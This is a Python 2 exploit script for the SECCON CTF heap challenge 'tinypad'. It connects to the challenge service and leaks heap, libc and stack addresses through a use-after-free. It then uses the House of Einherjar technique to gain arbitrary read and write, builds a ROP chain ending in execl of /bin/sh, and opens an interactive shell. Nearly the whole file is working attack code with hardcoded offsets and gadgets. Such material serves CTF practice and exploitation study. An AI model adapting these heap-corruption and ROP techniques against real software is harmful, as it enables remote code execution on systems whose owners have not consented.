#!/usr/bin/env python2

import hashlib
import re
import socket
import struct
import sys
import telnetlib


def p(x, t="<Q"): return struct.pack(t, x)

def u(x, t="<Q"): return struct.unpack(t, x)[0]

def unsigned(x): return u(p(x, t="<q"), t="<Q")

def read_until(f, delim='\n'):
    data = ""
    while not data.endswith(delim):
        data += f.read(1)
    return data

def connect(rhp):
    I("Connect to %s:%d"%(rhp))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
    s.connect(rhp)
    f = s.makefile('rw', bufsize=0)
    return s, f

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s

    I('4ll y0U n33D 15 5h3ll!!')
    t.interact()

def M(prefix, body):
    if len(body) == 1:
        body = ''.join(body)
    elif len(body) == 2:
        key, value = body
        if value <= 0xffffffff:
            value = '0x%08x'%(value)
        else:
            value = '0x%016x'%(value)
        body = '%s: %s'%(key, value)
    elif len(body) >= 3:
        body = '%s:%s'%(body[0], body[1:])

    text = '[{prefix}] {body}'.format(prefix=prefix, body=body)
    print text

def W(*body): M('!', body)
def N(*body): M('*', body)
def I(*body): M('+', body)
def RD(*body): M('D', repr(body))
def D(*body): M('D', body)

class IO(object):
    def __init__(self, rhp):
        self.rhp = rhp
        self.s, self.f = connect(self.rhp)

    def _read(self, size):
        return self.s.recv(size)

    def _write(self, buf):
        self.s.send(buf)

    def write(self, buf, end=''):
        self._write(buf+end)

    def writeln(self, buf):
        self.write(buf, end='\n')

    def read_until(self, delim='\n'):
        buf = ''
        while not buf.endswith(delim):
            buf += self._read(1)
        return buf

    def flush(self):
        self.f.flush()

    def close(self):
        self.f.close()
        self.s.close()

    def interact(self):
        interact(self.s)

### user-defined
class TinyPadIO(IO):

    def __init__(self, rhp):
        super(TinyPadIO, self).__init__(rhp)
        # self.writeln('dukucy!!'), for testing.
        self.read_until('(CMD)>>> ')

    def add(self, size, content):
        self.writeln('A')
        self.read_until('(SIZE)>>> ')
        self.writeln(str(size))
        self.read_until('(CONTENT)>>> ')
        self.writeln(content)
        self.read_until('(CMD)>>> ')

    def edit(self, index, content):
        self.writeln('E')
        self.read_until('(INDEX)>>> ')
        self.writeln(str(index))
        self.read_until('(CONTENT)>>> ')
        self.writeln(content)
        self.writeln('Y')
        self.read_until('(CMD)>>> ')

    def delete(self, index):
        self.writeln('D')
        self.read_until('(INDEX)>>> ')
        self.writeln(str(index))
        self.read_until('(CMD)>>> ')

    def quit(self):
        self.writeln('Q')


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print >> sys.stderr, "Usage: %s HOST PORT"%(sys.argv[0])
        print >> sys.stderr, "Tinypad is running on tinypad.pwn.seccon.jp:57463."
        sys.exit(0)

    host, port = sys.argv[1:]
    rhp = (host, int(port))
    tpio = TinyPadIO(rhp)

    # -- useful offsets
    offset_main_arena_58h = 0x3c3b20 + 0x58
    ''' {{{ 
    gdf> p/x (void *)&main_arena-(void *)$libc_base
    $9 = 0x3c3b20
    }}} '''

    offset_libc___libc_system = 0x45390
    ''' {{{ 
    gef> p/x (void *)&system-(void *)$libc_base
    $10 = 0x45390
    }}} '''

    offset_libc___libc_argv = 0x3c82f8
    ''' {{{ 
    > p/x (void *)&__libc_argv-(void *)$libc_base
    $12 = 0x3c82f8
    }}} '''

    ## calculate with debugger.
    offset_einherjar = 0x20
    offset_rop1 = 0xe0
    offset_popped_to_r12 = 0xd0
    offset_rop2 = 0xc8
    offset_rop3 = 0xb0

    offset_gadget1 = 0x11922a
    ''' {{{ 
    gef> x/5i $libc_base+0x0011921f+11
    0x7fb25f4aa22a <gethostbyname+410>:  pop    rbp
    0x7fb25f4aa22b <gethostbyname+411>:  pop    r12
    0x7fb25f4aa22d <gethostbyname+413>:  ret
    }}} '''

    offset_onegadget_rce = 0x6f5a6
    ''' {{{ 
    6f5a6:       48 8d 3d ca cb 11 00    lea    0x11cbca(%rip),%rdi        # 18c177 <_libc_intl_domainname@@GLIBC_2.2.5+0x197>
    6f5ad:       48 8d 15 c0 cb 11 00    lea    0x11cbc0(%rip),%rdx        # 18c174 <_libc_intl_domainname@@GLIBC_2.2.5+0x194>
    6f5b4:       48 8d 35 c1 cb 11 00    lea    0x11cbc1(%rip),%rsi        # 18c17c <_libc_intl_domainname@@GLIBC_2.2.5+0x19c>
    6f5bb:       45 31 c0                xor    %r8d,%r8d
    6f5be:       4c 89 e1                mov    %r12,%rcx
    6f5c1:       31 c0                   xor    %eax,%eax
    6f5c3:       e8 a8 c8 05 00          callq  cbe70 <execl@@GLIBC_2.2.5>
    }}} '''

    # -- useful addresses. 
    addr_ppr = 0x401510
    ''' {{{ 
    401510:       41 5e                   pop    %r14
    401512:       41 5f                   pop    %r15
    401514:       c3                      retq
    }}} '''
    addr_tinypad = 0x603040

    # -- begin exploit.

    ## 1. leak heap base, link fastbin-sized chunk to the specified free list.
    tpio.add(0x78, 'A'*0x8)
    tpio.add(0x78, 'B'*0x8)
    tpio.add(0x100, 'C'*0x8)
    tpio.delete(2)
    tpio.delete(1)

    ### UAF
    tpio.writeln('')
    data = tpio.read_until('(CMD)>>> ')
    result = re.findall(r'#   INDEX: 1\n # CONTENT: (.+)', data)
    if result:
        heap_base = u(result[0].ljust(8, '\0')) - 0x80
    if not heap_base:
        W('Couldn\'t get the heap base...')
        tpio.close()
        sys.exit(-1)
    I('heap base: '+hex(heap_base))

    ## 2. leak libc addr and calculate some addresses.

    ### put free()'d chunks to unsorted_chunks by malloc_consolidate().
    tpio.delete(3)

    ### UAF
    tpio.writeln('')
    data = tpio.read_until('(CMD)>>> ')
    result = re.findall(r'#   INDEX: 1\n # CONTENT: (.+)', data)
    if result:
        libc_base = u(result[0].ljust(8, '\0')) - offset_main_arena_58h 
    I('libc base: '+hex(libc_base))

    ### calculate some stuffs.
    addr_libc___libc_system = libc_base + offset_libc___libc_system
    addr_libc___libc_argv = libc_base + offset_libc___libc_argv
    addr_libc_binsh = libc_base + 0x18c177

    ## 3. make a condition of House of Einherjar
    tpio.add(0x18, 'EINHERJAR#'.ljust(0x18, 'A'))
    tpio.add(0x100, 'B'*0xf8+'\x11')
    tpio.add(0x100, 'C'*0xf8)
    addr_einherjar = heap_base + offset_einherjar
    N('addr_einherjar: 0x%08x'%(addr_einherjar))

    ### forge a fake chunk nearby tinypad#page
    addr_fakechunk, fakechunk_size = addr_tinypad + 0xd0, 0x101
    fakechunk = ''.join((
        p(fakechunk_size).rjust(0x8, 'P'),
        p(addr_fakechunk), p(addr_fakechunk), 
        )).rjust(0xf0, 'P')
    tpio.edit(3, fakechunk)
    
    ### get a diff between the target chunk and the fake chunk
    diff = unsigned(addr_einherjar - addr_fakechunk) 
    N('addr_fakechunk - addr_einherjar: 0x%08x'%(diff))

    ### unset PREV_INUSE
    data = '\x01'.rjust(0x18+2, 'P')
    tpio.edit(1, data)

    ### '\0' padding
    w = p(diff).strip('\0')
    if len(w) != 3:
        W('Too many NUL bytes in the diff.')
        tpio.close()
        sys.exit(-1)
    number_of_zeros = len(p(diff))-len(w)
    for i in range(number_of_zeros+1):
        data = w.rjust(0x18-i, 'P')
        tpio.edit(1, data)

    ### trigger House of Einherjar.
    tpio.delete(2)
    for i in range(len(w)-1):
        tpio.edit(3, '\x01\x01'.rjust(0xd8+len(w)-i))

    ## 4. get both arbitrary read and write. 

    ### malloc() the forged chunk and put some fake tinypad#page.
    fake_pads = ''.join((
        'P'*0x20,
        'P'*0x8, p(addr_tinypad+0x100),
        ### addr_tinypad+0x100+0x28 is the same as &tinypad[2].pad
        'P'*0x8, p(addr_tinypad+0x100+0x28),
        'P'*0x8, p(addr_libc___libc_argv),
        ### get a stack address
        'P'*0x8, p(addr_libc___libc_argv), 
        ))
    tpio.add(0x100-8, fake_pads)

    ## 5. construct a rop chain. 

    ### leak a stack address,
    tpio.writeln('')
    data = tpio.read_until('(CMD)>>> ')
    result = re.findall(r'#   INDEX: 4\n # CONTENT: (.+)', data)
    if result:
        addr_stack_argv = u(result[0][-6:].ljust(8, '\0'))
    N('addr_stack_argv: '+hex(addr_stack_argv))

    # and calculate some useful addresses.
    addr_rop1 = addr_stack_argv - offset_rop1
    addr_rop2 = addr_stack_argv - offset_rop2
    addr_rop3 = addr_stack_argv - offset_rop3
    addr_value_popped_to_r12 = addr_stack_argv - offset_popped_to_r12
    N('return address is at '+hex(addr_rop1))

    ### put "sh" on the specified memory as the parameter for /bin/sh.
    tpio.edit(2, p(addr_value_popped_to_r12))
    tpio.edit(3, p(addr_libc_binsh))

    ### put the rop1
    tpio.edit(2, p(addr_rop1))
    tpio.edit(3, p(libc_base + offset_gadget1))

    ### put the rop2
    tpio.edit(2, p(addr_rop2))
    w = p(diff).strip('\0')
    number_of_zeros = len(p(addr_ppr)) - len(w)
    for i in range(number_of_zeros+1):
        tpio.edit(3, 'A'*(8-i))
    tpio.edit(3, p(addr_ppr))

    ### put the rop3
    tpio.edit(2, p(addr_rop3))
    tpio.edit(3, 'A'*(7))
    tpio.edit(3, p(libc_base + offset_onegadget_rce))

    ## 6. quit to get a shell
    tpio.quit()
    tpio.interact()

